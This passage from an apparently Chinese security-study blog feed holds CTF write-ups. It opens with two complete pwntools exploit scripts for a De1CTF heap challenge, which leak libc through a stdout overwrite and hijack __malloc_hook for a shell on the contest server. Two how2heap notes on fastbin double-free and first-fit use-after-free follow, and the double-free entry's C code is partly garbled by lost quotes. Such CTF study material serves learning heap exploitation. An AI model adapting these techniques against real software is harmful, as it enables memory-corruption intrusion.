class="string">"padding"</span>):</span><br><span class="line">cmd(1)</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">":\n"</span>,name)</span><br><span class="line">def free(idx):</span><br><span class="line">cmd(2)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line">def edit(idx,name):</span><br><span class="line">cmd(3)</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">":\n"</span>,name)</span><br><span class="line">def Add(size,idx,name=<span class="string">"padding"</span>):</span><br><span class="line">Cmd(1)</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">":"</span>,name)</span><br><span class="line">def Free(idx):</span><br><span class="line">Cmd(2)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">"139.180.216.34"</span>,8888)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">add(0x18,0)</span><br><span class="line">add(0x18,1)</span><br><span class="line">add(0x60,2,p64(0x0)+p64(0x21)+<span class="string">'\x00'</span>*0x18+p64(0x21)*5)</span><br><span class="line">add(0x60,3,p64(0x21)*12)</span><br><span class="line">add(0x60,4)</span><br><span class="line">add(0x60,5)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x18,0,<span class="string">"\x50"</span>)</span><br><span class="line">add(0x18,0,<span class="string">'\x00'</span>*8)</span><br><span class="line">add(0x18,0,<span class="string">"A"</span>)</span><br><span class="line"></span><br><span class="line">add(0x18,0,<span class="string">'GET'</span>)</span><br><span class="line"></span><br><span class="line">edit(2,p64(0x0)+p64(0x91))</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">add(0x18,0)</span><br><span class="line">add(0x60,0,<span class="string">'\xdd\x25'</span>)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(5)</span><br><span class="line">free(2)</span><br><span class="line">free(5)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'')</span></span><br><span class="line">add(0x60,4,<span class="string">'\x70'</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">add(0x60,0)</span><br><span class="line">add(0x60,0)</span><br><span class="line">add(0x60,0)</span><br><span class="line">add(0x60,0,<span class="string">'\x00'</span>*(0x40+3-0x10)+p64(0x1800)+<span class="string">'\x00'</span>*0x19)</span><br><span class="line">p.read(0x40)</span><br><span class="line"></span><br><span class="line">base=u64(p.read(6).ljust(8,<span class="string">'\x00'</span>))-(0x7ffff7dd2600-0x7ffff7a0d000)</span><br><span class="line">log.warning(hex(base))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">libc=ELF(<span class="string">"./pwn"</span>).libc</span><br><span class="line">Add(0x60,0)</span><br><span class="line">Add(0x60,1)</span><br><span class="line">Add(0x18,2)</span><br><span class="line">Free(0)</span><br><span class="line">Free(1)</span><br><span class="line">Free(0)</span><br><span class="line">Add(0x60,0,p64(libc.sym[<span class="string">'__malloc_hook'</span>]+base-35))</span><br><span class="line">Add(0x60,0)</span><br><span class="line">Add(0x60,0)</span><br><span class="line">one=0xf02a4</span><br><span class="line">Add(0x60,0,<span class="string">'\x00'</span>*19+p64(one+base))</span><br><span class="line"></span><br><span class="line">Free(1)</span><br><span class="line">Free(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二</span><br><span class="line">当我们使用scanf输入一些内容。如果你输入了很多东西，它会将一个0x400块进行malloc暂时保存。如果我们保留一些fastbin，当malloc.it将被放入smallbin.now我们也有libc地址。</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p = process("./weapon")</span></span><br><span class="line">p = remote(<span class="string">"139.180.216.34"</span>,8888)</span><br><span class="line">elf = ELF(<span class="string">"./weapon"</span>)</span><br><span class="line">a = elf.libc</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">def create(idx,size,content):</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; \n"</span>)</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.recvuntil(<span class="string">"weapon: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">def delete(idx):</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(str(2))</span><br><span class="line">p.recvuntil(<span class="string">"idx :"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(str(3))</span><br><span class="line">p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"content:\n"</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">create(0,0x60,<span class="string">"a"</span>)</span><br><span class="line">create(1,0x60,<span class="string">"b"</span>)</span><br><span class="line">create(2,0x60,<span class="string">"c"</span>)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>*0x1000)</span><br><span class="line">create(3,0x60,<span class="string">"\xdd\x25"</span>)</span><br><span class="line">create(4,0x60,<span class="string">"e"</span>)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">edit(1,<span class="string">"\x00"</span>)</span><br><span class="line">create(5,0x60,<span class="string">"f"</span>)</span><br><span class="line">create(6,0x60,<span class="string">"f"</span>)</span><br><span class="line">file_struct = p64(0xfbad1887)+p64(0)*3+<span class="string">"\x58"</span></span><br><span class="line">create(7,0x60,<span class="string">"\x00"</span>*0x33+file_struct)</span><br><span class="line">libc_addr =  u64(p.recvuntil(<span class="string">"\x00"</span>,drop=True)[1:].ljust(8,<span class="string">"\x00"</span>))-a.symbols[<span class="string">"_IO_2_1_stdout_"</span>]-131</span><br><span class="line"><span class="built_in">print</span> hex(libc_addr)</span><br><span class="line">delete(6)</span><br><span class="line">edit(6,p64(libc_addr+a.symbols[<span class="string">"__malloc_hook"</span>]-0x23))</span><br><span class="line"></span><br><span class="line">create(8,0x60,<span class="string">"t"</span>)</span><br><span class="line"></span><br><span class="line">create(9,0x60,<span class="string">"a"</span>*0x13+p64(libc_addr+0xf1147))</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; \n"</span>)</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.recvuntil(<span class="string">"weapon: "</span>)</span><br><span class="line">p.sendline(str(0x60))</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(str(6))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="De1ctf" scheme="http://yoursite.com/categories/De1ctf/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fastbin_dup</title>
    <link href="http://yoursite.com/2019/08/02/fastbin_dup/"/>
    <id>http://yoursite.com/2019/08/02/fastbin_dup/</id>
    <published>2019-08-02T03:42:03.636Z</published>
    <updated>2019-08-02T12:58:27.284Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include stdio.h</span></span><br><span class="line"><span class="comment">#include stdlib.h</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, This file demonstrates a simple double-free attack with fastbins.n);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, Allocating 3 buffers.n);</span><br><span class="line">int a = malloc(8);</span><br><span class="line">int b = malloc(8);</span><br><span class="line">int c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, 1st malloc(8) %pn, a);</span><br><span class="line">fprintf(stderr, 2nd malloc(8) %pn, b);</span><br><span class="line">fprintf(stderr, 3rd malloc(8) %pn, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, Freeing the first one...n);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, If we free %p again, things will crash because %p is at the top of the free list.n, a, a);</span><br><span class="line"> free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, So, instead, we<span class="string">'ll free %p.n, b);</span></span><br><span class="line"><span class="string">free(b);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fprintf(stderr, Now, we can free %p again, since it'</span>s not the head of the free list.n, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, Now the free list has [ %p, %p, %p ]. If we malloc 3 <span class="built_in">times</span>, we<span class="string">'ll get %p twice!n, a, b, a, a);</span></span><br><span class="line"><span class="string">fprintf(stderr, 1st malloc(8) %pn, malloc(8));</span></span><br><span class="line"><span class="string">fprintf(stderr, 2nd malloc(8) %pn, malloc(8));</span></span><br><span class="line"><span class="string">fprintf(stderr, 3rd malloc(8) %pn, malloc(8));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xb74010</span><br><span class="line">2nd malloc(8): 0xb74030</span><br><span class="line">3rd malloc(8): 0xb74050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xb74010 again, things will crash because 0xb74010 is at the top of the free list.</span><br><span class="line">*** Error <span class="keyword">in</span> `./fastbin_dup_double_free<span class="string">': double free or corruption (fasttop): 0x0000000000b74010 ***</span></span><br><span class="line"><span class="string">======= Backtrace: =========</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x790cb)[0x7fe7c6e7d0cb]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x82c9a)[0x7fe7c6e86c9a]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fe7c6e8ad8c]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x400740]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7fe7c6e243f1]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x40054a]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">当我们运行程序后，程序发生了明显的报错，这是一个典型的 double free 。意味通常而言，一个已经 free 掉的 chunk 是不能被 free 第二次的。然后我们把原本的注释加上。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">首先 程序malloc了三个chunk</span></span><br><span class="line"><span class="string">然后free(a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printf(stderr, 3rd malloc(8) %pn, c);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fprintf(stderr, Freeing the first one...n);</span></span><br><span class="line"><span class="string">free(a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fprintf(stderr, If we free %p again, things will crash because %p is at the top of the free list.n, a, a);</span></span><br><span class="line"><span class="string"> free(a);##这个free(a)是不行的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后free(b) free(a)</span></span><br><span class="line"><span class="string">fprintf(stderr, So, instead, we'</span>ll free %p.n, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, Now, we can free %p again, since it<span class="string">'s not the head of the free list.n, a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这个时候，fastbin 形成一个 fastbin freelist</span></span><br><span class="line"><span class="string">chunk A ---&gt; chunk B</span></span><br><span class="line"><span class="string"> 然后我们再把 a free 一次</span></span><br><span class="line"><span class="string"> free(a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fprintf(stderr, Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'</span>ll get %p twice!n, a, b, a, a);</span><br><span class="line">fprintf(stderr, 1st malloc(8) %pn, malloc(8));</span><br><span class="line">fprintf(stderr, 2nd malloc(8) %pn, malloc(8));</span><br><span class="line">fprintf(stderr, 3rd malloc(8) %pn, malloc(8));</span><br><span class="line"></span><br><span class="line">|Chunk A| -&gt; |chunk B| --&gt;| chunk A|</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin-&gt;fd 来遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。然后再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=
      
    
    </summary>
    
      <category term="how2heap" scheme="http://yoursite.com/categories/how2heap/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>first_fit</title>
    <link href="http://yoursite.com/2019/08/02/first_fit.c/"/>
    <id>http://yoursite.com/2019/08/02/first_fit.c/</id>
    <published>2019-08-01T23:36:00.555Z</published>
    <updated>2019-08-02T04:25:36.797Z</updated>
    
    <content type="html"><![CDATA[<p>堆的系统学习</p><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">char* a = malloc(512);</span><br><span class="line">char* b = malloc(256);</span><br><span class="line">char* c;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">fprintf(stderr, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">fprintf(stderr, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">strcpy(a, <span class="string">"this is A!"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">c = malloc(500);</span><br><span class="line">fprintf(stderr, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">fprintf(stderr, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">strcpy(c, <span class="string">"this is C!"</span>);</span><br><span class="line">fprintf(stderr, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">fprintf(stderr, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">fprintf(stderr, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">执行程序后的输出</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file doesn<span class="string">'t demonstrate an attack, but shows the nature of glibc'</span>s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited <span class="keyword">in</span> a use-after-free situation.</span><br><span class="line">Allocating  buffers. They can be large, don<span class="string">'t have to be fastbin.</span></span><br><span class="line"><span class="string">1st ): 0x245b420</span></span><br><span class="line"><span class="string">2nd ): 0x245b630</span></span><br><span class="line"><span class="string">we could continue mallocing here...</span></span><br><span class="line"><span class="string">now let'</span>s put a string at a that we can <span class="built_in">read</span> later <span class="string">"this is A!"</span></span><br><span class="line">first allocation 0x245b420 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don<span class="string">'t need to free anything again. As long as we allocate less than 512, it will end up at 0x245b420</span></span><br><span class="line"><span class="string">So, let'</span>s allocate 500 bytes</span><br><span class="line">3rd ): 0x245b420</span><br><span class="line">And put a different string here, <span class="string">"this is C!"</span></span><br><span class="line">3rd allocation 0x245b420 points to this is C!</span><br><span class="line">first allocation 0x245b420 points to this is C!</span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br><span class="line"></span><br><span class="line">这个案例只是讲了glibc分配chunk时的first fit原则,可以用于use after free漏洞,比较简单,对照看看源码和输出即可,</span><br><span class="line"></span><br><span class="line">我的理解是 free(a)之后a的指针空闲了出来 除非字节大于512 不然还是输出a的值 0x245b420，c字节为500，所以还是输出0x245b420</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</span><br><span class="line">释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于top chunk的解释，请参考下面的介绍。</span><br><span class="line">当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</span><br><span class="line"></span><br><span class="line">Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。</span><br><span class="line">在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</span><br><span class="line"></span><br><span class="line">uaf 造成原因：</span><br><span class="line"></span><br><span class="line">​ 指针free 掉后并没有置0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;堆的系统学习&lt;/p&gt;
&lt;h3 id=&quot;first-fit&quot;&gt;&lt;a href=&quot;#first-fit&quot; class=&quot;headerlink&quot; title=&quot;first_fit&quot;&gt;&lt;/a&gt;first_fit&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;
      
    
    </summary>
    
      <category term="how2heap" scheme="http://yoursite.com/categories/how2heap/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
</feed>
